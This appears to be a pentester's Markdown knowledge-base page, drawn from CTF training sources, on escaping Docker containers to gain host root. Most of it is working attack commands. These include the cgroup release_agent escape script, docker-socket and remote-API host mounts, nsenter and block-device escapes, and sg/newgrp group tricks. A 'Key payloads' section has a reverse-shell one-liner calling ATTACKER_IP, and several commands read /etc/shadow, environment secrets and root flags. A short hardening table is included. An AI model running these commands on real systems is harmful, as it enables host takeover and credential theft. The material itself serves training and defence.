---
title: "Docker Container Attacks"
type: technique
tags: [exploitation, linux, privilege-escalation, thm]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-05-13
sources: [thm-linux-docker, 0xdf-containers]
---

## What it is

Docker container attacks are techniques used to break isolation between a container and its host OS, abuse exposed Docker management surfaces, or extract sensitive information from within a container. The goal is typically to gain root-level code execution on the underlying host.

## How it works

Docker relies on Linux kernel features (namespaces, cgroups, capabilities) to isolate containers from the host. Misconfigurations weaken or eliminate this isolation. A privileged container or an exposed Docker socket effectively grants an attacker the same level of access as root on the host because container processes can interact with host kernel facilities.

## Prerequisites

- Shell access inside a container (e.g. via web app RCE)
- One of: privileged mode enabled, `docker` group membership, exposed Docker socket (`/var/run/docker.sock`), shared host namespace, or remote Docker API on port 2375

## Methodology

### 1. Detect if inside a container

```bash
# Few processes running = likely a container
ps aux

# PID 1 is init/systemd on real hosts; something else in containers
cat /proc/1/cmdline

# Container-specific mounts
cat /proc/1/mounts | grep -i docker

# Check for .dockerenv
ls /.dockerenv
```

### 2. Check capabilities

```bash
# List current capabilities
capsh --print

# Interesting capabilities for escape
# cap_sys_admin  → mount syscall available (cgroup escape)
# cap_sys_ptrace → nsenter possible
# cap_dac_read_search → read any file on host
```

### 3. Enumerate environment for secrets

```bash
# Environment variables often hold DB passwords, API keys, tokens
env
cat /proc/1/environ | tr '\0' '\n'

# Config files with hard-coded credentials (WordPress example)
cat /var/www/html/wp-config.php
grep -r "password" /var/www/ 2>/dev/null
```

### 4. Privileged container escape (cgroup notify_on_release)

Requires `CAP_SYS_ADMIN`. Abuses cgroup release_agent to execute commands as root on the host.

```bash
# Step 1: Mount rdma cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Step 2: Enable notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release

# Step 3: Find container path on host filesystem
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Step 4: Point release_agent to our exploit
echo "$host_path/exploit" > /tmp/cgrp/release_agent

# Step 5-7: Create and execute payload on host
echo '#!/bin/sh' > /exploit
echo "cat /root/root.txt > $host_path/output.txt" >> /exploit
chmod a+x /exploit

# Step 8: Trigger release_agent
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Read result written by host root process
cat /output.txt
```

### 5. Docker socket abuse

If `/var/run/docker.sock` is mounted into the container, any user with access to it can control Docker on the host.

```bash
# Confirm socket is present
ls -la /var/run/docker.sock

# Mount host filesystem into a new alpine container and chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Now you have root access to the full host filesystem
cat /etc/shadow
cat /root/root.txt
```

### 6. Remote Docker API abuse (port 2375)

```bash
# Probe unauthenticated API
nmap -sV -p 2375 <TARGET_IP>
curl http://<TARGET_IP>:2375/version

# List containers remotely
docker -H tcp://<TARGET_IP>:2375 ps

# Launch privileged container mounting host root
docker -H tcp://<TARGET_IP>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 7. Namespace escape via nsenter

When a container shares the host PID namespace (can see host processes):

```bash
# Confirm host PID 1 is visible
ps aux | grep -E "^\w+\s+1\s"

# Enter all namespaces of PID 1 and spawn bash
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

This places the shell in the host's mount, UTS, IPC, and network namespaces with the kernel's privileges.

### 8. Docker group privilege escalation

If your user is in the `docker` group on the host:

```bash
# Verify group membership
groups | grep docker

# Mount host root and chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Key payloads / examples

```bash
# One-liner: mount host root via docker socket inside container
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# nsenter escape (shared PID namespace)
nsenter --target 1 --mount --uts --ipc --net /bin/bash

# Remote API: spawn reverse shell on host via exec
docker -H tcp://TARGET:2375 run --rm -it alpine /bin/sh -c 'nc -e /bin/sh ATTACKER_IP 4444'
```

## Bypasses and variants

- **LXD group escape**: Similar to Docker group — if user is in `lxd` group, create an Alpine container with `security.privileged=true` and mount the host filesystem. See [[linux-privesc]].
- **Docker-in-Docker**: Containers running their own Docker daemon can be escaped if the inner socket is accessible.
- **Image inspection**: `docker image save <image> | tar -xf - ` to read image layers and extract secrets baked into image history.
- **Vulnerability scanning**: Use `grype imagename --scope all-layers` or `docker scout cves` to find vulnerable packages in images.

### From the Wild — HTB pivots tied to Docker (slug `0xdf-containers`)

| Machine | What matters |
|---------|---------------|
| **Ready** | **Privileged GitLab container** exposes both **cgroup notify_on_release** escapes and naive **direct host mounts** documented in compose metadata; reinforces that `privileged: true` plus kernel caps equals host RCE.|
| **Toolbox** | **Docker Toolbox / VirtualBox** era Windows host ships a lightweight Linux helper VM containing **default cred SSH** into the VM plus host admin keys reachable from container context.|
| **Fatty** | After **Java deserialization shell inside Tomcat**, root path abuses **scp from container to host** with **Tar archive tricks** overwriting host user SSH trust (container-to-host breakout without modern socket mounts).|

When enumerating escapes, correlate **capabilities** (`capsh`), **mountinfo** hints, **`docker.sock` mounts**, compose files under `/srv` or `/opt`, and **legacy Docker Desktop stacks** on Windows.

## Detection and defence

| Hardening control | Details |
|---|---|
| Avoid `--privileged` | Assign only needed capabilities with `--cap-add` / `--cap-drop=ALL` |
| Do not mount Docker socket | Especially dangerous in CI/CD |
| Restrict remote API | Use TLS (`--tlsverify`) or SSH contexts instead of unauthenticated port 2375 |
| cgroups limits | `docker run --cpus=1 --memory=256m` to prevent resource abuse |
| Seccomp profiles | `--security-opt seccomp=/path/to/profile.json` to restrict syscalls |
| AppArmor profiles | `--security-opt apparmor=/path/to/profile` to restrict resource access |
| Image scanning | Regularly scan images with Grype, Docker Scout, or Anchore |
| CIS Benchmark | Run OpenSCAP or CIS Docker Benchmark tool to audit configuration |

```bash
# Minimal hardened container example
docker run --rm -it \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --security-opt seccomp=/path/to/profile.json \
  --security-opt apparmor=/path/to/profile \
  --memory="256m" --cpus="1" \
  mywebserver
```

## Tools

- [[metasploit]]
- `capsh` — list capabilities
- `nsenter` — enter namespaces
- `grype` — image vulnerability scanner
- `docker scout` — Docker's built-in image scanner

## Sources

- THM: Container Vulnerabilities (containervulnerabilitiesDG)
- THM: Container Hardening (containerhardening)
- `0xdf-containers`: Ready (`privileged`/cgroup dual path), Toolbox (Docker Toolbox VM key theft), Fatty (`tar`/scp breakout)

## Triage: a DEFAULT-hardened container -- check loot before grinding escapes

When you land root inside a NON-privileged container (via web-app RCE), the standard escapes are
often ALL blocked - do not sink hours into them before checking cheaper loot paths. Quick read:
```bash
grep Cap /proc/self/status        # CapEff 00000000a80425fb == Docker DEFAULT caps (no CAP_SYS_ADMIN)
grep Seccomp /proc/self/status    # 2 == a seccomp filter is active (blocks unshare(CLONE_NEWUSER))
cat /sys/fs/cgroup/devices/devices.list   # only char 1:3/1:5/1:9 == block-device mknod escape dead
ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null   # absent == no socket escape
```
With Docker default caps + default seccomp these are DEAD: **CVE-2022-0492 cgroup `release_agent`**
(userns creation is seccomp-blocked, so you never gain CAP_SYS_ADMIN to mount a cgroup), the **mknod
raw-disk read** (device cgroup denies block devices), **nsenter** (separate PID ns + no
CAP_SYS_PTRACE), and **SSH password reuse** (host is usually publickey-only).

Cheaper paths to check FIRST - any one often ends the box:
- **Backup tooling** - `borg`/`borgmatic`/`restic` config -> repo passphrase -> an old archive holds a
  root SSH key -> `ssh` to the host. Often THE intended path. See [[linux-privesc]].
- **Writable host bind-mount** - `grep ' /usr/src/app\| /opt\| /root' /proc/self/mountinfo` reveals a
  bind's HOST source path; if the host runs anything from it as root (a cron), inject.
- **Host networking** (`network_mode: host`) - the container shares the host net ns, so `ss -tlnp`
  lists the HOST's services (ssh, redis, a docker API); attack those directly.
- **Shared unix sockets** in a mounted volume (a postgres socket -> `COPY ... TO PROGRAM`) - but note
  a sibling container is usually LESS privileged (CapEff=0), not a host escape.

<!-- promoted-slug: hardened-container-escape-triage -->

### Privileged container escape: mount the host block device (cgroup-v2-proof)

When the `release_agent`/`notify_on_release` trick (section 4) fails because the host is **cgroup
v2** (mounting a v1 controller returns EPERM), a **fully privileged** container still escapes by
mounting the host's root block device directly. Preconditions: `CAP_SYS_ADMIN` (full caps ->
`CapEff: 000001ffffffffff`) and the host device nodes present in the container's `/dev` (both come
from `docker run --privileged`).

**Prefer the socket pivot first.** This device mount is the *privileged shortcut* - it only works
because the container is `--privileged` (full caps + host devices). The more portable and auditable
vector, when the container has its own `/certs` or a reachable daemon, is a Docker **socket/TLS pivot
to the HOST daemon**: `docker --tlsverify --tlscacert /certs/... -H tcp://<gateway>:2376 run -v /:/host ...`
(the default gateway from `ip route` is usually the host). That works even on a *hardened* container
where the raw mount would be blocked, so try it first; fall back to the device mount if the daemon
is unreachable or the certs are rejected. Distinguish a host daemon from a DinD down-link with
`docker ps` (host shows the container itself + siblings; a down-link shows only children).

```sh
# 1. confirm full caps
grep CapEff /proc/self/status            # 000001ffffffffff = all caps (privileged)
# 2. find the host root disk (the device backing /etc/hostname in /proc/mounts is a giveaway)
ls -la /dev/nvme0n1p1 /dev/sda1 /dev/vda1 /dev/xvda1 2>/dev/null
# 3. mount it -> full host filesystem, read/write as root
mkdir -p /tmp/hostfs && mount /dev/nvme0n1p1 /tmp/hostfs
ls /tmp/hostfs/.dockerenv 2>/dev/null || echo REAL_HOST_FS   # no .dockerenv confirms host, not a sibling container
cat /tmp/hostfs/root/root.txt            # or drop an SSH key / cron for host root
```

Notes:
- `/proc/self/mountinfo` reveals the device: the container's `/etc/hostname` and `/etc/hosts` are
  bind-mounted from `<hostdisk>` (e.g. `/dev/nvme0n1p1 on /etc/hostname`), naming the disk to mount.
- A privileged container's **own** `docker.sock` may be a DIND *down-link* (its daemon runs child
  containers) - `docker run -v /:/mnt` there mounts the container's fs, not the host. The block-device
  mount is the reliable up-and-out. Distinguish by `docker ps` (shows children, not the host).
- Also works with just `CAP_SYS_ADMIN` + a readable host device even without every other cap.

<!-- promoted-slug: priv-container-host-disk-mount -->

## Acquiring the docker group after a partial-setuid SUID (sg / newgrp)

Docker-group privesc assumes your shell already carries the `docker` supplementary group. A common
CTF twist breaks that assumption: a **custom SUID binary that only `setuid()`s** to a docker-group
service account and then `execl("/bin/bash")` gives you that account's **UID but keeps your original
group set** (setuid does not re-init supplementary groups), so `docker` still hits
`permission denied ... /var/run/docker.sock`:

```bash
find / -perm -4000 -type f 2>/dev/null | grep -v /snap    # a custom SUID owned by e.g. dockermgr
/usr/local/bin/diag_shell                                 # -> uid=<svc>, but groups unchanged
id                                                        # uid=1501(dockermgr) groups=1500(oldgrp)  <- no docker
```

Pick up the missing group without a password: confirm the UID is a member in `/etc/group`, then use
`sg` (run one command with the group) or `newgrp` (spawn a shell with it as primary gid) - both are
SUID-root and only need existing membership:

```bash
grep -E '^docker:' /etc/group          # docker:x:998:ubuntu,dockermgr   <- our UID is a member
sg docker -c 'id; docker ps'           # gid=998(docker) now present -> socket works
# then the usual docker-group -> root file access:
sg docker -c 'docker run -v /:/mnt --rm alpine chroot /mnt sh -c "id; cat /root/..."'
sg docker -c 'docker exec <running-container> sh -c "cat /app/secret.py"'   # read a sibling container
```

The same `sg <grp>`/`newgrp <grp>` trick applies to any group your effective UID belongs to but your
current process' group set omits (`lxd`, `disk`, `adm`) after a setuid-only foothold. See [[linux-privesc]].

<!-- promoted-slug: docker-group-newgrp-acquire -->
